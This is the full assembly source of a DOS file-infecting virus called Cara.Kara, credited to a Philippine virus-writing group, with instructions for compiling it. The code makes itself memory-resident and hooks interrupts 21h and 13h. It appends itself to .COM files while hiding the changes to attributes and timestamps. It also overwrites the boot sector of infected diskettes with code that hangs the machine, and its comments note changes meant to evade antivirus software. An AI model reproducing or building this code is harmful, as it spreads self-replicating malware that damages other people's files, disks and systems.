    ;-----------------------------------------------------------
    ; Cara.Kara.xxx
    ; Updated by Putoksa Kawayan
    ;
    ; HEX-FILES No. 1
    ; Manila, Philippines
    ;
    ;
    ; compile in a86 v4.02:
    ;
    ;        a86 carakara.asm carakara.com
    ;
    ; can also be compiled in tasm 2.01 and masm 5.0. the length of the
    ; object code created by tasm and masm are different. masm's is a bit
    ; longer.
    ;
    ;-----------------------------------------------------

    carakara segment para 'code'
    assume cs:carakara,ds:carakara

    org     0

    _mem_need       equ     ((((persgen-_init)+15)/16)+1)
    _vir_len        equ     (_conta-_init)
    _messtart       equ     ((_txt_1-_mespop)+7c3eh)

    _init:  jmp     persgen                 ;<--- replaced with mov si,xxxx
            mov     ax,100h                 ;  by first generation routine
            cwd                             ;  xxxx modified somewhere else
            mov     di,ax                   ;
            cld                             ; restore victim codes
            movsw                           ;
            movsw                           ;
            movsw                           ;
            movsw                           ;----------------
            xchg    dx,ax
            push    dx                      ;----------------
            mov     es,ax                   ; memory self recognition
            add     di,((61h*4)-(100h+8))   ;  same as in cara.standard
            mov     cx,3*2                  ;  but 4 bytes short
            repe scasw                      ;
            jnz     _init_2                 ;----------------
            xchg    di,ax
            mov     ax,cs
            mov     es,ax
            push    ax                      ;----------------
            mov     cx,_mem_need            ; make room for virii
            mov     ah,4ah                  ;  and allocate mem
            mov     bx,-1                   ;
            int     21h                     ;
            mov     ah,4ah                  ;
            sub     bx,cx                   ;
            int     21h                     ;
            mov     ah,48h                  ;
            dec     cx                      ;
            mov     bx,cx                   ;
            int     21h                     ;----------------
            mov     cx,4
            pop     dx
            push    di
            push    ax
            mov     es,ax
            dec     ax
            mov     ds,ax
            shl     bx,cl
    _temp_a:mov     si,100h                 ; offset is modified somewhere
            mov     bp,si
            add     cx,cx
            mov     [di+1],cx               ; set os as mcb owner
            mov     ds,dx
            mov     [di+2],ax               ; reset top of mem
    _init_1:movsw
            cmp     bx,di                   ; copy virii to top of mem
            ja      _init_1
            call    _mem_ck
            pop     bx
            pop     ds
            mov     ax,2163h                ;----------------
            call    _savect                 ; save and reset
            mov     ax,offset _is_dos       ;
            call    _setint                 ;  int 13 and 21
            mov     ax,1362h                ;
            call    _savect                 ;
            mov     ax,offset _is_dsk       ;
            call    _setint                 ;----------------
    _init_2:push    cs
            pop     es
            push    cs
            pop     ds
    _init_3:ret                             ; execute victim program

    ;---------------------------------------- virus signatures
    ;-----------  offset,signature word
    ;------------------------------------
    _vx_sig dw      066h,0ff25h     ;sampo
            dw      047h,0fecch     ;nyb
            dw      04bh,0d6ebh     ;welcomb
            dw      0a7h,0d3cdh     ;antiexe
            dw      04dh,04b22h     ;stoned.angelina
            dw      060h,04848h     ;stoned.noint
            dw      041h,03eafh     ;quaint
            dw      142h,01acdh     ;stoned.michelangelo
            dw      13dh,01acdh     ;ripper
            dw      0b0h,01acdh     ;form
            dw      19fh,00301h     ;anticmos
            dw      17fh,00301h     ;stoned.standard
            dw      0               ;---------------- end of sig

    ;--------------------------------------------------------------------
    ; if adding some more signatures, get a word value anywhere from
    ; offset 003e to 01fd of the boot sector. content of offsets 0002 to
    ; 003d, and 01fe to 01ff are preserved. if you get the sig from the
    ; preserved offsets, Cara.Kara will find the diskette as infected and
    ; will write a message popper on every fourth read from diskette.
    ; this will affect disk access and we don't want to do that.
    ;--------------------------------------------------------------------

    _savect:mov     si,ax                   ;----------------
            mov     cl,2                    ; this is from the original
            shl     ax,cl                   ; modified it a bit to hide
            and     ax,3fch                 ; it from avs
            xchg    si,ax
            mov     cl,6                    ; save interrupt
            shr     ax,cl
            and     ax,3fch
            xchg    di,ax
            mov     ax,[di]
            mov     [si],ax
            mov     ax,[di+2]
            mov     [si+2],ax
            ret

    _setint:cli                             ; this is mine
            mov     [di],ax                 ; hook interrupt routine
            mov     [di+2],bx
            sti
            ret

    _mem_ck:int     12h                     ; from original
            and     al,15                   ; boot vx memory check
            jz      _init_3
            mov     ah,9
            mov     dx,offset _txt_3
            add     dx,bp
            int     21h
            mov     dx,offset _txt_2
            add     dx,bp
            int     21h
            ret

    _is_dsk:pushf                           ; based on original
            cmp     dl,2                    ; modified it a bit
            jnb     _disk_4
            cmp     ah,2                    ; read of dbs of a: and b: only
            jne     _disk_4
            cmp     byte ptr cs:[_conta],4  ; counter carried over from orig
            jnb     _disk_1
            inc     byte ptr cs:[_conta]
            jmp     short _disk_4
    _disk_1:pusha
            push    ds
            push    es
            push    cs
            pop     ds
            push    cs
            pop     es
            mov     bx,offset _boot
            sub     dh,dh
            mov     ah,1                    ; read boot sector
            call    _13_int
            jc      _disk_3
            mov     si,offset _vx_sig       ; check if dbs is infected
    _disk_2:lodsw
            or      ax,ax                   ; end of vx sig?
            jz      _disk_3
            xchg    di,ax                   ; load di with location of sig
            lodsw                           ; get sig word
            cmp     ax,[bx+di]              ; is diskette infected?
            jne     _disk_2
            mov     word ptr [bx],3cebh     ; set jumper to mess popper
            lea     di,[bx+3eh]
            mov     si,offset _mespop
            mov     cx,(1feh-3eh)
            repe movsb                      ; copy mess popper
            mov     ah,2
            call    _13_int                 ; write mess popper to disk
    _disk_3:sub     ax,ax                   ; reset disk
            mov     [_conta],al             ; set counter to 0
            int     62h
            pop     es
            pop     ds
            popa
    _disk_4:popf
            int     62h                     ; execute original read call
            retf    2                       ; return to caller

    _start  db      0e9h                    ; my jumper
    _temp_b dw      'yM'                    ; jmp displacement, modified....
            db      'KARA',26               ; my sig

    _mespop:cli                             ; this is my message popper
            xor     ax,ax                   ;   or trojan to others
            mov     ss,ax
            mov     sp,7c00h
            sti
            push    ss
            pop     ds
            mov     si,_messtart
            mov     bh,al
            mov     ah,0eh
    _pop_a: lodsb
            cmp     al,'$'                  ; end of message
    _pop_b: je      _pop_b                  ; infinite loop!!!!!!
            int     10h
            jmp     _pop_a

    ;-----------------------------------
    ;--- mess popper message -----------
    ;-----------------------------------

    _txt_1  db      'Ang disk mo ay inpektado',13,10
            db      'I-boot mo uli'
    _txt_2  db      13,10,10
            db      'Klandistino',13,10
            db      'Awto',13,10
            db      'Reproduktibo',13,10
            db      'Antibayrus',13,10,2,13,10,'$'

    _is_err:mov     al,0                    ; int 24 handler
            iret

    ;-----------------------------------
    ;--- boot virus in memory message --
    ;-----------------------------------
    _txt_3  db      'May bayrus sa memorya$'


    _13_int:mov     cx,4                    ; int 13 routine
            mov     al,1
            add     ah,al
    _13_a:  push    ax
            push    cx
            mov     cl,1
            int     62h
            pop     cx
            pop     ax
            jnc     _13_b
            push    ax
            mov     ah,ch
            int     62h
            pop     ax
            loop    _13_a
    _13_b:  ret

    _save   db      'HEXFILES'              ; this should be 8 bytes

    _is_dos:pushf                           ; my file infector
            cmp     ah,4bh                  ; exec
            je      _gro_1
            cmp     ah,3dh                  ; file open
            je      _gro_1
            cmp     ah,43h                  ; file attribute
            je      _gro_1
            cmp     ah,56h                  ; rename file
            je      _gro_1
            popf
            int     63h                     ; execute int 21
            retf    2                       ; return to caller

    _gro_1: pusha
            push    ds
            push    es
            mov     di,dx
            push    ds
            pop     es
            sub     al,al                   ; get end of file spec
    _gro_2: scasb
            jnz     _gro_2
            mov     ax,es:[di-4]            ; com checker
            or      ax,2020h                ; only checks if .co
            cmp     ax,'oc'
            jz      _gro_3
            jmp     _gro_8
    _gro_3: push    ds
            sub     ax,ax
            mov     ds,ax
            mov     ax,2461h                ; save and reset int 24
            call    _savect                 ;
            mov     bx,cs                   ;
            mov     ax,offset _is_err       ;
            call    _setint                 ;
            pop     ds
            mov     ax,4300h                ; get file attribute
            int     63h
            mov     bx,cx
            sub     cx,cx
            mov     ax,4301h                ; clear file attribute
            int     63h
            jc      _gro_7
            push    ds
            push    dx
            push    bx
            mov     ax,3d02h                ; open file
            int     63h
            jc      _gro_6
            push    cs
            pop     ds
            xchg    bx,ax                   ; prepare for infect check
            mov     cx,8
            mov     dx,offset _save
            mov     ah,3fh
            int     63h
            mov     si,dx
            mov     ax,[si+3]               ; is file infected?
            cmp     ax,'AK'                 ; check if KARA is in file's
            jne     _gro_4                  ;   4th to 7th byte
            mov     al,'R'
            cmp     [si+5],ax
            je      _gro_5
    _gro_4: sub     cx,cx
            mov     dx,cx
            mov     ax,4202h                ; get file length
            int     63h
            cmp     ax,4096                 ; 4 kb?
            jb      _gro_5
            add     ax,100h                    ; set up offsets
            mov     word ptr ds:[_temp_a+1],ax ; start of virii
            sub     ax,103h
            mov     [_temp_b],ax               ; jump displacement
            add     ax,((offset _save)+103h)
            mov     word ptr ds:[_init+1],ax   ; location of victim code
            mov     cx,_vir_len
            mov     ah,40h                  ; write virii
            cwd
            int     63h
            mov     cx,dx
            mov     ax,4200h
            int     63h
            mov     ah,40h                  ; write jumper and sig
            mov     cl,8
            mov     dx,offset _start
            int     63h
            mov     ax,5700h                ; preserve file time and date
            int     63h
            inc     ax
            int     63h
    _gro_5: mov     ah,3eh                  ; close file
            int     63h
    _gro_6: pop     cx
            pop     dx
            pop     ds
            mov     ax,4301h                ; restore attribute
            int     63h
    _gro_7: sub     ax,ax
            mov     ds,ax
            mov     ax,6124h                ; restore int 24
            call    _savect
    _gro_8: pop     es
            pop     ds
            popa
            popf
            int     63h                     ; execute int 21
            retf    2                       ; return to caller

    _conta db      ?                        ; disk read counter

    _boot   db      200h dup (?)            ; read boot buffer

    ;---------------------------------------
    ;--- first generation ------------------
    ;---------------------------------------
                                            ; first generation codes
                                            ; is a simplified version
                                            ; of _init routine
                                            ;
    persgen:mov     byte ptr cs:[100h],0beh ; put mov si,xxxx opcode to
            mov     bx,-1                   ; virii start, operand is set
            mov     ah,4ah                  ; by virii on infection
            int     21h
            mov     cx,_mem_need            ; we need a separate first
            sub     bx,cx                   ; generation because of
            mov     ah,4ah                  ; the structure of the
            int     21h                     ; virii entry point.
            dec     cx
            mov     bx,cx
            mov     ah,48h
            int     21h
            mov     es,ax
            dec     ax
            mov     ds,ax
            mov     word ptr ds:[1],8
            push    cs
            pop     ds
            mov     word ptr ds:[2],ax
            xor     di,di
            mov     si,100h
            mov     cx,offset persgen
            cld
            rep movsb
            push    es
            mov     ax,3521h
            int     21h
            push    es
            push    bx
            mov     ax,3513h
            int     21h
            xor     ax,ax
            mov     ds,ax
            mov     ds:[62h*4],bx
            mov     ds:[(62h*4)+2],es
            pop     word ptr ds:[63h*4]
            pop     word ptr ds:[(63h*4)+2]
            pop     ds
            cli
            mov     dx,offset _is_dos
            mov     ax,2521h
            int     21h
            mov     dx,offset _is_dsk
            mov     ax,2513h
            int     21h
            sti
            mov     ax,4c00h
            int     21h

    carakara ends

     end  _init
